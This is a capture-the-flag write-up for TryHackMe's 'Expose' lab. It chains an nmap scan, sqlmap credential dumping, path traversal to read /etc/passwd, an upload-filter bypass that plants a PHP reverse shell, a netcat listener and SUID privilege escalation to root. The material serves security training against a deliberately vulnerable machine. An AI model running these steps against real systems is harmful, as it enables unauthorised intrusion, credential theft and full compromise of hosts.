# Expose
### Difficulty level: Easy
------------------------------------------

Start with Nmap to scan open ports, services, versions and save the results into a file.

```bash
nmap -sC -sV -p- <ip-address> > nmap.txt
```

Results:
```bash
Nmap scan report for <ip-address>
Host is up (0.095s latency).
Not shown: 3972 closed tcp ports (reset), 27 filtered tcp ports (no-response)
PORT     STATE SERVICE                 VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<ip-address>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cb:54:91:99:ba:5c:f0:b1:f0:7c:0c:23:39:e0:f2:ed (RSA)
|   256 1a:97:87:56:bf:b1:ca:90:f3:7d:40:66:3a:25:b6:4a (ECDSA)
|_  256 5b:e3:24:25:9a:1d:ff:94:a3:eb:7e:6e:e3:20:ce:30 (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
|
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/messages/stored: 31
|     $SYS/broker/clients/active: 1
|     $SYS/broker/load/bytes/received/1min: 63.04
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/load/messages/received/15min: 0.20
|     $SYS/broker/load/messages/received/5min: 0.59
|     $SYS/broker/clients/total: 1
|     $SYS/broker/load/bytes/sent/1min: 371.87
|     $SYS/broker/store/messages/bytes: 147
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/messages/received/1min: 2.74
|     $SYS/broker/load/sockets/5min: 0.39
|     $SYS/broker/load/bytes/sent/5min: 79.93
|     $SYS/broker/heap/maximum: 51456
|     $SYS/broker/load/sockets/15min: 0.13
|     $SYS/broker/bytes/sent: 407
|     $SYS/broker/subscriptions/count: 2
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/messages/received: 3
|     $SYS/broker/load/publish/sent/1min: 10.05
|     $SYS/broker/load/bytes/received/15min: 4.57
|     $SYS/broker/load/connections/1min: 1.83
|     $SYS/broker/messages/sent: 14
|     $SYS/broker/clients/connected: 1
|     $SYS/broker/uptime: 4906 seconds
|     $SYS/broker/load/bytes/received/5min: 13.55
|     $SYS/broker/store/messages/count: 31
|     $SYS/broker/retained messages/count: 35
|     $SYS/broker/load/connections/5min: 0.39
|     $SYS/broker/publish/bytes/sent: 61
|     $SYS/broker/load/bytes/sent/15min: 26.97
|     $SYS/broker/load/connections/15min: 0.13
|     $SYS/broker/heap/current: 51056
|     $SYS/broker/load/publish/sent/15min: 0.73
|     $SYS/broker/clients/maximum: 1
|     $SYS/broker/bytes/received: 69
|     $SYS/broker/publish/messages/sent: 11
|     $SYS/broker/load/publish/sent/5min: 2.16
|     $SYS/broker/load/messages/sent/15min: 0.93
|     $SYS/broker/load/messages/sent/1min: 12.79
|     $SYS/broker/load/sockets/1min: 1.67
|_    $SYS/broker/load/messages/sent/5min: 2.75

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3391.25 seconds
```

So, there are 5 open ports:

21- FTP.

22- SSH.

53- DNS.

1337 — HTTP.

1883 — mosquitto.

Start with FTP, there is allowed anonymous connection, check it:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*8VeNQVlLl5bLfZY4Rp09Rw.png)

```bash
It’s time for educational comment:

That is a good way to upload files to the target machine if it’s allowed to.

use “put <file-name>”.
```

Because port 1337 which is HTTP is open, check it on browser:

```bash
http://<ip-address>:1337
```
![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*JnPoeb6cQigjNFuC37HNLQ.png)

Find directories within the system with Gobuster:

```bash
gobuster dir -u http://<ip-address>:1337 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

There are some directories:

```bash
/admin 
/javascript
/phpmyadmin
/server-status
/admin_101
```

Start with /admin:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*owTjRNtziJPmfnRNiTbCwg.png)

After few attempts to submit credentials without any response, inspect the source code of this page and there are no function of login, it is just the design of the webpage. So the answer is: no, this is not the right admin portal.

Check the next relevant page /phpmyadmin.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*V2ASkizgosivO4O5VgVOvw.png)

There is login page.

On to the next one /admin101.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*TmduhnHY7Ku6qDkcEKi-Fw.png)

It feels like this is the page that must be inspected and not /phpmyadmin.
So, after the request was sent , there is pop-up error message.
Open burp and grab the request and the response for real inspection.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*sLKYkukwY0xpXHfWd4buFg.png)

This response tells that the login page communicates with sql database so maybe there is sqli vulnerability.
Grab the request and save it into a file.
Use sqlmap to find databases names:

```bash
sqlmap -r req.txt -dbs --dump
```
Results:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*hcONZdkgRK5Gb-ULpRTY8Q.png)

There is password for our email:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*JX5RWzC8tU6fBRwdsph6LQ.png)

There is another interesting information:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*6BOf7ISDzx0MPaRsLLeobQ.png)

So, enter the account with the password:

![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*DWHLdyiRRYY1CpdChnaJcQ.png)

We are in but there is nothing here.
Check the path that is written inside the database:

```bash
<ip-address>:1337/file1010111/index.php
```

There is password input. So grab the hash inside the database that 
relates to this URL and crack it.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*782iOq78eGYoetCXzK98sQ.png)

Enter the password to get this page:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*CVPEe3KNRQinVCxCgw7Jgg.png)

There is a clue that tells us to take a look inside the DOM. Check the source code.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GI1H4myMaM5YmJQcXtNsmw.png)

The hint says that there is injection of “file” parameter within the URL.
But what’s the value of this parameter?
Try path traversal to read /etc/passwd.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*oLTw4puGlMg82RJZaqcAmQ.png)

It works. This is the content of /etc/passwd.
Move to the next path that is written inside the database:
```bash
/upload-cv00101011/index.php
```

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*toOosTld3Y9kvQeNr54Jsw.png)

Check the user’s list inside /etc/passwd and find a user that starting with letter “z”.
zeamkish is the user.
There is a new page:

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*52Yi8bZl1dARwumCnJdShA.png)

First, check if there is any validation or whitelisting of the types of the files
that is possible to upload:

![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*qwnD4Yl_nVgK0yv3zX6liQ.png)

There is file extension validation: only JPG and PNG.
Upload reverse-shell to the system but first, change the extension to png.
Before any click on the upload button, open burp and grab the request,
because maybe there is an option to change the extension back to .php to execute
the reverse shell and bypass the validation.

After the file is uploaded, there is a message that tells us the path that our
uploaded is located.
 ![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*e3hHPy2yprEGgM84MlUBRQ.png)

 ![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*V8IhDYAs7zAwbIZx6YB7pA.png)

 The path is:

<ip-address>:1337/upload-cv00101011/upload_thm_1001/

So, change the extension back to .php to make it as executional code and send
the requestagain(means uploading the php-reverse-shell.php
and check if it was uploaded as php file successfully).

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*KFZ7YEMgFwKB39lHUad5YA.png)

It made it successfully into the system. Easy bypass.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*NNmdA1m-QbSRWMZuERzL3A.png)

Open netcat listener:
```bash
nc -lnvp 2222
```
Execute the file by clicking on it.
And there is a shell:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*5clMzSaXbL594YaGYsrv3A.png)

Stable the shell with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Find the first flag:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*UadgnvzmZkFVpsfCDhF9rA.png)

Oh, the permission denied because zeamkish has read permission, 
but www-data cannot read it.
There are ssh credentials to connect this user so connect with those credentials with ssh.

![image](https://miro.medium.com/v2/resize:fit:606/format:webp/1*KNE31CaTKCPZAfob95B2ZQ.png)

```bash
ssh zeamkish@<ip-address>
```

And we are in:
![image](https://miro.medium.com/v2/resize:fit:750/format:webp/1*fLzX9Fa4-T9-yftVflMykg.png)

Get the flag.txt:
![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*33fpqvNXhKaRX260UyAFQw.png)

*Privilege Escalation*
find files that have SUID permission to get root:

```bash
find / -perm -u=s 2>/dev/null
```

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ytHYpdL9NaZt9p7w5m8JEw.png)

Escalate permissions with binary suid.
gtfobins :
```bash
gtfobins.github.io
```
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

After running this code, we are root.
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*F2taBQ1qvKo6GxMuqzXNDg.png)

This is expose capture the flag on TryHackMe platform.
Hope you find this writeup helpful.

Happy Hacking!

**Written by Alon Presman, Penetration Tester and Ethical Hacker.**


























